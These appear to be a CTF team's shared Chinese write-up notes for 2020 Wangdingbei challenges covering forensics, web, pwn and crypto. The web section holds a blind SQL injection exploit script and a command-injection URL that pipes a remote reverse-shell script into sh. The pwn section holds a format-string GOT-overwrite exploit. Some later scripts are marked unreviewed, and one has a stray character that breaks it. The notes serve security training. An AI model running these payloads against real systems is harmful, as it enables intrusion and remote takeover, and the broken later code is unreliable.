**题目状态**

| 状态简写   | 状态   |    | 状态说明   |
|:----|:----|:----|:----|
| W   | Wait   |    | 没有人做这道题，你可以开始尝试   |
| A   | Active   |    | 有人正在做这道题，你可以跟他进行交流   |
| S   | Stuck   |    | 题目做到一半思路卡壳   |
| F   | Finished   |    | 完成该题   |
| F1   | Finish & First Blood   |    | 完成并获得一血   |
| F2   | Finish & Second Blood   |    | 完成并获得二血   |
| F3   | Finish & Third Blood   |    | 完成并获得三血   |
| FW   | Finish & Lack WP   |    | 完成并缺少WP   |

插入一条MISC题目：

## 密码柜（`Elcomsoft Password Recovery`）

#### 题目考点

- 内存取证
- KeePass密钥恢复
- Bitlocker密钥恢复

#### 解题思路

夏风师傅的取证题，十分的硬核和复杂。首先打开一个vmem文件和Database.kdbx文件，kdbx文件使用`KeePass`软件读取，需要一个密码，应该是在win10的vmem中找。于是取证大师一把梭（其实也可以使用volatility，但是十分麻烦，还是取证大师一把梭简单），数据恢复后得到 [![img](https://static.ctfhub.com/writeup/challenge/2020/wangdingbei/baihu/misc/mimagui/01.png?imageMogr2/auto-orient/blur/1x0/quality/75|watermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim)](https://static.ctfhub.com/writeup/challenge/2020/wangdingbei/baihu/misc/mimagui/01.png?imageMogr2/auto-orient/blur/1x0/quality/75|watermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim) 查找txt有个 [![img](https://static.ctfhub.com/writeup/challenge/2020/wangdingbei/baihu/misc/mimagui/02.png?imageMogr2/auto-orient/blur/1x0/quality/75|watermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim)](https://static.ctfhub.com/writeup/challenge/2020/wangdingbei/baihu/misc/mimagui/02.png?imageMogr2/auto-orient/blur/1x0/quality/75|watermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim) 打开后是

```

密码柜的密码可不能忘了，毕竟那里面存着我最重要的东西而且我走哪都要带着它6s4mxkhvge
```

用这个`KeePass`的密码解密，得到 [![img](https://static.ctfhub.com/writeup/challenge/2020/wangdingbei/baihu/misc/mimagui/03.png?imageMogr2/auto-orient/blur/1x0/quality/75|watermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim)](https://static.ctfhub.com/writeup/challenge/2020/wangdingbei/baihu/misc/mimagui/03.png?imageMogr2/auto-orient/blur/1x0/quality/75|watermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim) 这也是一种加密，密钥就是main_key，里面有一个Advanced，可以把里面一个something.kge文件导出，密码就是main_key：`XLlArBkn`。导出后再使用`KGB Archiver`对数据进行解压，得到一个BitLocker硬盘，但是没有密钥文件，猜测还是再vmem的win10镜像中，使用`Elcomsoft Password Recovery`对vmem进行提取，得到 [![img](https://static.ctfhub.com/writeup/challenge/2020/wangdingbei/baihu/misc/mimagui/04.png?imageMogr2/auto-orient/blur/1x0/quality/75|watermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim)](https://static.ctfhub.com/writeup/challenge/2020/wangdingbei/baihu/misc/mimagui/04.png?imageMogr2/auto-orient/blur/1x0/quality/75|watermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim) 导出后双击挂载解压的BitLocker硬盘，然后再用`Elcomsoft Password Recovery`对用刚刚导出的密钥对BitLocker硬盘进行解密 [![img](https://static.ctfhub.com/writeup/challenge/2020/wangdingbei/baihu/misc/mimagui/05.png?imageMogr2/auto-orient/blur/1x0/quality/75|watermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim)](https://static.ctfhub.com/writeup/challenge/2020/wangdingbei/baihu/misc/mimagui/05.png?imageMogr2/auto-orient/blur/1x0/quality/75|watermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim) 然后就可以得到BitLocker的恢复密钥

```

294173-189123-573023-455081-459382-434610-344091-286275
```

输入恢复密钥即可解锁进入硬盘 [![img](https://static.ctfhub.com/writeup/challenge/2020/wangdingbei/baihu/misc/mimagui/06.png?imageMogr2/auto-orient/blur/1x0/quality/75|watermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim)](https://static.ctfhub.com/writeup/challenge/2020/wangdingbei/baihu/misc/mimagui/06.png?imageMogr2/auto-orient/blur/1x0/quality/75|watermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim) 里面是一个自解压程序，打开这个程序后发现 [![img](https://static.ctfhub.com/writeup/challenge/2020/wangdingbei/baihu/misc/mimagui/07.png?imageMogr2/auto-orient/blur/1x0/quality/75|watermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim)](https://static.ctfhub.com/writeup/challenge/2020/wangdingbei/baihu/misc/mimagui/07.png?imageMogr2/auto-orient/blur/1x0/quality/75|watermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim) aux是windows里的一种保留字，强行保存也打不开文件，所以我们对其进行重命名，之后用命令行对其进行cat操作 [![img](https://static.ctfhub.com/writeup/challenge/2020/wangdingbei/baihu/misc/mimagui/08.png?imageMogr2/auto-orient/blur/1x0/quality/75|watermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim)](https://static.ctfhub.com/writeup/challenge/2020/wangdingbei/baihu/misc/mimagui/08.png?imageMogr2/auto-orient/blur/1x0/quality/75|watermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim) 是一个PNG图片，那就加一个后缀名打开，得到flag [![img](https://static.ctfhub.com/writeup/challenge/2020/wangdingbei/baihu/misc/mimagui/09.png?imageMogr2/auto-orient/blur/1x0/quality/75|watermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim)](https://static.ctfhub.com/writeup/challenge/2020/wangdingbei/baihu/misc/mimagui/09.png?imageMogr2/auto-orient/blur/1x0/quality/75|watermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim)





# Web

---
## W | 张三的网站 | 12end

post register.php发现盲注

email=321243412%40qq.com&username=a'or sleep(5) or'1&password=1&submit=Register

过滤了逗号，布尔盲注payload:

(select substr(hex(hex((select * from flag))) from {} for {}))

看着界面挺熟悉，去搜了一下发现是网鼎杯2018-unfinised原题，github上搜了exp：

[https://github.com/virink/ctftraining_exps/blob/master/wdb_2018_unfinished.py](https://github.com/virink/ctftraining_exps/blob/master/wdb_2018_unfinished.py)

```plain
import requests
import string
import re as r

ch = string.ascii_lowercase+string.digits+'-}'+'{'

re = requests.session()
url = '.ichunqiu.com/'

def register(email,username):
    url1 = url+'register.php' 
    data = dict(email = email, username = username,password = 'adsl1234')
    html = re.post(url1,data=data)
    html.encoding = 'utf-8'
    return html

def login(email):
    url2 = url+'login.php'
    data = dict(email = email,password = 'adsl1234')
    html = re.post(url2, data=data)
    html.encoding = 'utf-8'
    return html


f = ''
for j in range(0,17):
    payload = "0'^(select substr(hex(hex((select * from flag))) from {} for {}))^'0".format(int(j)*10+1,10)
    email = '{}@qq.com'.format(str(j)+'14')
    html = register(email,payload)
    # print html.text
    html = login(email)
    try:
        res = r.findall(r'<span class="user-name">(.*?)</span>',html.text,r.S)
        flag = res[0][1:].strip()
        print flag
        f += flag
        print f
        print f.decode('hex').decode('hex')
    except:
        print "problem"

```

---
## W | 题目名称 | 12end


[file:///etc/passwd下载](file:///etc/passwd下载)[不下来，但是直接/etc/passwd却](file:///etc/passwd下载不下来，但是直接/etc/passwd却)能够下载，然后尝试下载app.py或main.py

```plain
pfrom flask import Flask, Response
from flask import render_template
from flask import request
import os
import urllib

app = Flask(__name__)

SECRET_FILE = "/tmp/secret.txt"
f = open(SECRET_FILE)
SECRET_KEY = f.read().strip()
os.remove(SECRET_FILE)



@app.route('/')
def index():
    return render_template('search.html')



@app.route('/page')
def page():
    url = request.args.get("url")
    try:
        if not url.lower().startswith("file"):
            res = urllib.urlopen(url)
            value = res.read()
            response = Response(value, mimetype='application/octet-stream')
            response.headers['Content-Disposition'] = 'attachment; filename=beautiful.jpg'
            return response
        else:
            value = "HACK ERROR!"
    except:
        value = "SOMETHING WRONG!"
    return render_template('search.html', res=value)



@app.route('/no_one_know_the_manager')
def manager():
    key = request.args.get("key")
    print(SECRET_KEY)
    if key == SECRET_KEY:
        shell = request.args.get("shell")
        os.system(shell)
        res = "ok"
    else:
        res = "Wrong Key!"

    return res



if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```
通过/proc/self/fd/3获取到secret（因为源码读了一次，所以描述符中存在）
Vfx4X0xBern4QmR1ofvrws5BoEBhPz/xQNlBmQCV7Ec=

于是访问[http://2f0f44e9e0f943feb564657c92b0372cc1e1dc6cf57c4322.cloudgame2.ichunqiu.com:8080/no_one_know_the_manager?key=Vfx4X0xBern4QmR1ofvrws5BoEBhPz/xQNlBmQCV7Ec=&shell=curl%20http://nysec.cn/shell/106.14.124.138:8989|sh](http://2f0f44e9e0f943feb564657c92b0372cc1e1dc6cf57c4322.cloudgame2.ichunqiu.com:8080/no_one_know_the_manager?key=Vfx4X0xBern4QmR1ofvrws5BoEBhPz/xQNlBmQCV7Ec=&shell=curl%20http://nysec.cn/shell/106.14.124.138:8989|sh)

获取到反弹shell，在/root/flag.txt中找到flag



---
## W | StarBucket | 12end

![图片](https://uploader.shimo.im/f/vXsT6i7Vs97W7vTH.png!thumbnail)

上传报错页面发现用的是s3存储，审计页面源代码，发现顶部的useid是根据session生成的随机值，查看网络请求发现存在info.js，

![图片](https://uploader.shimo.im/f/EHm1uIqHhCKHRKqV.png!thumbnail)

且存在admin变量，show flag提示not admin，于是就要想办法把info.js中的admin替换为true，可以看到在上传前先请求了signature.php来获取到s3的policy

![图片](https://uploader.shimo.im/f/NNuoFPfyNzST1fyu.png!thumbnail)

猜测后端未对acl做验证，尝试传入acl=public-read-write后发现传回来了能够写文件的policy，至此便能够正常上传（在此之前acl是public-read，不可写，所以无法上传），然后伪造admin为true的info.js，成功上传后再次访问，后端就会判断当前用户为admin，flag就回显在页面上

fetch('./signature.php?acl=public-read-write&key=userinfo/'+userid+'/info.js')

        .then(res => res.json())

        .then(json => {

            for(let key in json){

                $('input[name='+key+']')[0].value = json[key];

            }

        })

上传info.js

{"admin":true,"avatar":"zxc"}

刷新页面

![图片](https://uploader.shimo.im/f/oytEDi0SwQ3w9gwh.png!thumbnail)























































后边的内容未经整理和思考，仅供参考

# MISC

---
## F | py | 解题做题人

src是源程序，根据题目可以知道这是一个py打包的exe，更改后缀，可以发现需要输入key，才能得到flag，使用pyinstaller恢复pyc文件。恢复得到另一个src文件

![图片](https://uploader.shimo.im/f/bb8btO36GkY7aPAN.png!thumbnail)

使用base_library中任意的pyc文件恢复文件头，得到src.pyc文件。文件头恢复脚本如下：

```python
f = open("src","rb").read()
header = b"\xee\x0c\x0d\x0a\x1a\xdf\xa6\x53\x29\x48\x20\x20"
print(f)
res = open("flag.pyc","wb")
res.write(header)
res.write(f)
res.close()
```
最后反编译src.pyc文件。得到源码如下：
```python
import rsa
import base64
key1 = rsa.PrivateKey.load_pkcs1(base64.b64decode('LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcVFJQkFBS0NBUUVBcVJUZ0xQU3BuT0ZDQnJvNHR1K1FBWXFhTjI2Uk42TzY1bjBjUURGRy9vQ1NJSU00ClNBeEVWaytiZHpSN2FucVNtZ1l5MEhRWGhDZTM2U2VGZTF0ejlrd0taL3UzRUpvYzVBSzR1NXZ4UW5QOWY1cTYKYVFsbVAvVjJJTXB5NFFRNlBjbUVoNEtkNm81ZWRJUlB2SHd6V0dWS09OQ3BpL0taQ082V0tWYkpXcWh3WGpEQgpsSDFNVURzZ1gyVUM4b3Bodnk5dXIyek9kTlBocElJZHdIc1o5b0ZaWWtaMUx5Q0lRRXRZRmlKam1GUzJFQ1RVCkNvcU9acnQxaU5jNXVhZnFvZlB4eHlPb2wwYVVoVGhiaHE4cEpXL3FPSFdYd0xJbXdtNk96YXFVeks4NEYyY3UKYWRiRE5zeVNvaElHaHYzd0lBVThNSlFnOEthd1Z3ZHBzRWhlSXdJREFRQUJBb0lCQURBazdwUStjbEZtWHF1Vgp1UEoyRWxZdUJpMkVnVHNMbHZ0c1ltL3cyQnM5dHQ0bEh4QjgxYlNSNUYyMEJ2UlJ4STZ3OXlVZCtWZzdDd1lMCnA5bHhOL3JJdWluVHBkUEhYalNhaGNsOTVOdWNOWEZ4T0dVU05SZy9KNHk4dUt0VHpkV3NITjJORnJRa0o4Y2IKcWF5czNOM3RzWTJ0OUtrUndjbUJGUHNJalNNQzB5UkpQVEE4cmNqOFkranV3SHZjbUJPNHVFWXZXeXh0VHR2UQova0RQelBqdTBuakhkR055RytkSDdkeHVEV2Jxb3VZQnRMdzllZGxXdmIydTJ5YnZzTXl0NWZTOWF1a01NUjNoCnBhaDRMcU1LbC9ETTU3cE44Vms0ZTU3WE1zZUJLWm1hcEptcVNnSGdjajRPNWE2R1RvelN1TEVoTmVGY0l2Tm8KWFczTEFHRUNnWWtBc0J0WDNVcFQ3aUcveE5BZDdSWER2MENOY1k1QnNZOGY4NHQ3dGx0U2pjSWdBKy9nUjFMZQpzb2gxY1RRd1RadUYyRTJXL1hHU3orQmJDTVVySHNGWmh1bXV6aTBkbElNV3ZhU0dvSlV1OGpNODBlUjRiVTRyCmdYQnlLZVZqelkzNVlLejQ5TEVBcFRQcTZRYTVQbzhRYkF6czhuVjZtNXhOQkNPc0pQQ29zMGtCclFQaGo5M0cKOFFKNUFQWEpva0UrMmY3NXZlazZNMDdsaGlEUXR6LzRPYWRaZ1MvUVF0eWRLUmg2V3VEeGp3MytXeXc5ZjNUcAp5OXc0RmtLRzhqNVRpd1RzRmdzem94TGo5TmpSUWpqb3cyVFJGLzk3b2NxMGNwY1orMUtsZTI1cEJ3bk9yRDJBCkVpMUVkMGVEV3dJR2gzaFhGRmlRSzhTOG5remZkNGFMa1ZxK1V3S0JpRXRMSllIamFZY0N2dTd5M0JpbG1ZK0gKbGZIYkZKTkowaXRhazRZZi9XZkdlOUd6R1h6bEhYblBoZ2JrZlZKeEVBU3ZCOE5NYjZ5WkM5THdHY09JZnpLRApiczJQMUhuT29rWnF0WFNxMCt1UnBJdEkxNFJFUzYySDJnZTNuN2dlMzJSS0VCYnVKb3g3YWhBL1k2d3ZscUhiCjFPTEUvNnJRWk0xRVF6RjRBMmpENmdlREJVbHhWTUVDZVFDQjcyUmRoYktNL3M0TSsvMmYyZXI4Y2hwT01SV1oKaU5Hb3l6cHRrby9sSnRuZ1RSTkpYSXdxYVNCMldCcXpndHNSdEhGZnpaNlNyWlJCdTd5Y0FmS3dwSCtUd2tsNQpoS2hoSWFTNG1vaHhwUVNkL21td1JzbTN2NUNDdXEvaFNtNmNXYTdFOVZxc25heGQzV21tQ2VqTnp0MUxQWUZNCkxZMENnWWdKUHhpVTVraGs5cHB6TVAwdWU0clA0Z2YvTENldEdmQjlXMkIyQU03eW9VM2VsMWlCSEJqOEZ3UFQKQUhKUWtCeTNYZEh3SUpGTUV1RUZSSFFzcUFkSTlYVDBzL2V0QTg1Y3grQjhjUmt3bnFHakFseW1PdmJNOVNrMgptMnRwRi8rYm56ZVhNdFA3c0ZoR3NHOXJ5SEZ6UFNLY3NDSDhXWWx0Y1pTSlNDZHRTK21qblAwelArSjMKLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0K'))
key2 = rsa.PublicKey.load_pkcs1(base64.b64decode('LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1JSUJDZ0tDQVFFQXFSVGdMUFNwbk9GQ0JybzR0dStRQVlxYU4yNlJONk82NW4wY1FERkcvb0NTSUlNNFNBeEUKVmsrYmR6UjdhbnFTbWdZeTBIUVhoQ2UzNlNlRmUxdHo5a3dLWi91M0VKb2M1QUs0dTV2eFFuUDlmNXE2YVFsbQpQL1YySU1weTRRUTZQY21FaDRLZDZvNWVkSVJQdkh3eldHVktPTkNwaS9LWkNPNldLVmJKV3Fod1hqREJsSDFNClVEc2dYMlVDOG9waHZ5OXVyMnpPZE5QaHBJSWR3SHNaOW9GWllrWjFMeUNJUUV0WUZpSmptRlMyRUNUVUNvcU8KWnJ0MWlOYzV1YWZxb2ZQeHh5T29sMGFVaFRoYmhxOHBKVy9xT0hXWHdMSW13bTZPemFxVXpLODRGMmN1YWRiRApOc3lTb2hJR2h2M3dJQVU4TUpRZzhLYXdWd2Rwc0VoZUl3SURBUUFCCi0tLS0tRU5EIFJTQSBQVUJMSUMgS0VZLS0tLS0K'))
def encrypt1(message):
    crypto_text = rsa.encrypt(message.encode(), key2)
    return crypto_text

def decrypt1(message):
    message_str = rsa.decrypt(message, key1).decode()
    return message_str

def encrypt2(tips, key):
    ltips = len(tips)
    lkey = len(key)
    secret = []
    num = 0
    for each in tips:
        if num >= lkey:
            num = num % lkey
        secret.append(chr(ord(each) ^ ord(key[num])))
        num += 1
    
    return base64.b64encode(''.join(secret).encode()).decode()

def decrypt2(secret, key):
    tips = base64.b64decode(secret.encode()).decode()
    ltips = len(tips)
    lkey = len(key)
    secret = []
    num = 0
    for each in tips:
        if num >= lkey:
            num = num % lkey
        secret.append(chr(ord(each) ^ ord(key[num])))
        num += 1
    
    return ''.join(secret)
flag = 'IAMrG1EOPkM5NRI1cChQDxEcGDZMURptPzgHJHUiN0ASDgUYUB4LGQMUGAtLCQcJJywcFmddNno/PBtQbiMWNxsGLiFuLwpiFlkyP084Ng0lKj8GUBMXcwEXPTJrRDMdNwMiHVkCBFklHgIAWQwgCz8YQhp6E1xUHgUELxMtSh0xXzxBEisbUyYGOx1DBBZWPg1CXFkvJEcxO0ADeBwzChIOQkdwXQRpQCJHCQsaFE4CIjMDcwswTBw4BS9mLVMLLDs8HVgeQkscGBEBFSpQFQQgPTVRAUpvHyAiV1oPE0kyADpDbF8AbyErBjNkPh9PHiY7O1ZaGBADMB0PEVwdCxI+MCcXARZiPhwfH1IfKitGOF42FV8FTxwqPzBPAVUUOAEKAHEEP2QZGjQVV1oIS0QBJgBDLx1jEAsWKGk5Nw03MVgmWSE4Qy5LEghoHDY+OQ9dXE44Th0='
key = 'this is key'
print(decrypt2('AAAAAAAAAAAfFwwRSAIWWQ==', key))
try:
    result = input('please input key: ')
    if result == decrypt2('AAAAAAAAAAAfFwwRSAIWWQ==', key):
        print(decrypt1(base64.b64decode(decrypt2(flag, result))))
    elif result == key:
        print('flag{0e26d898-b454-43de-9c87-eb3d122186bc}')
    else:
        print('key is error.')
except Exception:
    None
    e = None
    None
    
    try:
        pass
    finally:
        e = None
        del e
```
源码中给出了flag的信息，我们可以直接解密，或者计算key值最后调用src.exe获得flag。计算key值位 this is true key
![图片](https://uploader.shimo.im/f/PzwvhuciTGUDgjXo.png!thumbnail)

---
## W | 题目名称 | 解题做题人







---
## W | 题目名称 | 解题做题人







# RE

---
## W | 恶龙 | 解题做题人

![图片](https://uploader.shimo.im/f/kuZvo5krwoF4DEEm.png!thumbnail)

[hero.zip](https://uploader.shimo.im/f/mthe7xTw6zhNP4Yw.zip)



---
## 







---
## W | 题目名称 | 解题做题人







# PWN

---
## W | vivd | 解题做题人

[https://share.weiyun.com/sLw3QBHi](https://share.weiyun.com/sLw3QBHi)

nc 182.92.203.137 23457

![图片](https://uploader.shimo.im/f/SJGaRdp13q5egp8l.png!thumbnail)

---
## W | quantum_entanglement | Thriumph

nc 123.57.225.26 15246

[pwn2.rar](https://uploader.shimo.im/f/6SQJe0Erlmu71vWu.rar)



格式化字符串漏洞

```plain
from pwn import *
context.log_level = 'debug'
sh = process('./pwn')
#gdb.attach(sh)
exit_got = 0x804a028
shell_addr = 0x80489E5
sh.recvuntil("FirstName:")
payload = p32(exit_got)
sh.sendline(payload)
sh.recvuntil("LastName:")
payload = '%' + str(0x89de) + 'c' + '%20$hn'
sh.sendline(payload)
sh.interactive()
```

---
## W | 题目名称 | 解题做题人







# CRYPTO

---
## W | b64 | 解题做题人

张三看到了一个神秘的字符串，似乎是base64

[4.zip](https://uploader.shimo.im/f/HGhz8GGUE65rTcIV.zip)



base64换表，写了个脚本，跑了一下发现六个字母无映射：![图片](https://uploader.shimo.im/f/tq5PQs6XZkqBZnE1.png!thumbnail)

```plain
import base64
import string
cipher = "uLdAuO8duojAFLEKjIgdpfGeZoELjJp9kSieuIsAjJ/LpSXDuCGduouz"

string1 = list("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=")
string2 = list("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=")

leak_cipher = "pTjMwJ9WiQHfvC+eFCFKTBpWQtmgjopgqtmPjfKfjSmdFLpeFf/Aj2ud3tN7u2+enC9+nLN8kgdWo29ZnCrOFCDdFCrOFoF="
leak_plain = "ashlkj!@sj1223%^&*Sd4564sd879s5d12f231a46qwjkd12J;DJjl;LjL;KJ8729128713"
#leak_plain_b64 = base64.b64encode(leak_plain.encode()).decode()
leak_plain_b64 = "YXNobGtqIUBzajEyMjMlXiYqU2Q0NTY0c2Q4NzlzNWQxMmYyMzFhNDZxd2prZDEySjtESmpsO0xqTDtLSjg3MjkxMjg3MTM="


view_char = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-{}"

not_found_char = []

def is_all_view_char(s):
    for c in s:
        if char not in view_char:
            return False
    return True

# def resolve(chars,b64):
#     target = chars.pop()
#     for c in chars:
#         return resolve(b64.replace())

for i in range(len(leak_cipher)):
    char = leak_cipher[i]
    charAtS1 = string1.index(char)
    charAtC = leak_plain_b64[i]
    if string1[charAtS1]==string2[charAtS1]:
        string2[charAtS1] = charAtC

for i in range(len(string1)):
    if string1[i]==string2[i] \
        and string1[i] not in leak_cipher \
        and string1[i] in cipher:
            print(string1[i]+" not found")
            not_found_char.append(string1[i])

string1 = "".join(string1)
string2 = "".join(string2)

print(string2)
print(cipher.translate(str.maketrans(string1,string2)))
```
经过不断尝试，找出了其中解码后全部明文，并且形似flag的几个，尝试后提交成功：

---
## F | random | 

由于getrandom使用的是MT19937算法，而且泄露了700位的32bits结果，于是可以通过逆向前624位得到原始的state，然后根据原始的state，得到的701位的随机数，进而得到key。由于加密时，采用的是des加密。key已知，于是可以计算subkey，解密des，最后得到flag，最终脚本如下

```python
# -*- coding: utf-8 -*-
#!/usr/bin/python2
import base64
import random

hexadecimalcontrast = {
    '0': '0000',
    '1': '0001',
    '2': '0010',
    '3': '0011',
    '4': '0100',q
    '5': '0101',
    '6': '0110',
    '7': '0111',
    '8': '1000',
    '9': '1001',
    'a': '1010',
    'b': '1011',
    'c': '1100',
    'd': '1101',
    'e': '1110',
    'f': '1111',
}
IP = [58, 50, 42, 34, 26, 18, 10, 2,
      60, 52, 44, 36, 28, 20, 12, 4,
      62, 54, 46, 38, 30, 22, 14, 6,
      64, 56, 48, 40, 32, 24, 16, 8,
      57, 49, 41, 33, 25, 17, 9, 1,
      59, 51, 43, 35, 27, 19, 11, 3,
      61, 53, 45, 37, 29, 21, 13, 5,
      63, 55, 47, 39, 31, 23, 15, 7]
IP_1 = [40, 8, 48, 16, 56, 24, 64, 32,
        39, 7, 47, 15, 55, 23, 63, 31,
        38, 6, 46, 14, 54, 22, 62, 30,
        37, 5, 45, 13, 53, 21, 61, 29,
        36, 4, 44, 12, 52, 20, 60, 28,
        35, 3, 43, 11, 51, 19, 59, 27,
        34, 2, 42, 10, 50, 18, 58, 26,
        33, 1, 41, 9, 49, 17, 57, 25]
E = [32, 1, 2, 3, 4, 5,
     4, 5, 6, 7, 8, 9,
     8, 9, 10, 11, 12, 13,
     12, 13, 14, 15, 16, 17,
     16, 17, 18, 19, 20, 21,
     20, 21, 22, 23, 24, 25,
     24, 25, 26, 27, 28, 29,
     28, 29, 30, 31, 32, 1]
S = [[15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10,
      3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5,
      0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15,
      13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9, ],
     [10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8,
      13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1,
      13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7,
      1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12, ],
     [14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7,
      0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8,
      4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0,
      15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13, ],
     [7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15,
      13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9,
      10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4,
      3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14, ],
     [2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9,
      14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6,
      4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14,
      11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3, ],
     [12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11,
      10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8,
      9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6,
      4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13, ],
     [4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1,
      13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6,
      1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2,
      6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12, ],
     [13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7,
      1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2,
      7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8,
      2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11, ]]
PC_1 = [57, 49, 41, 33, 25, 17, 9, 1,
        58, 50, 42, 34, 26, 18, 10, 2,
        59, 51, 43, 35, 27, 19, 11, 3,
        60, 52, 44, 36, 63, 55, 47, 39,
        31, 23, 15, 7, 62, 54, 46, 38,
        30, 22, 14, 6, 61, 53, 45, 37,
        29, 21, 13, 5, 28, 20, 12, 4, ]
PC_2 = [14, 17, 11, 24, 1, 5, 3, 28,
        15, 6, 21, 10, 23, 19, 12, 4,
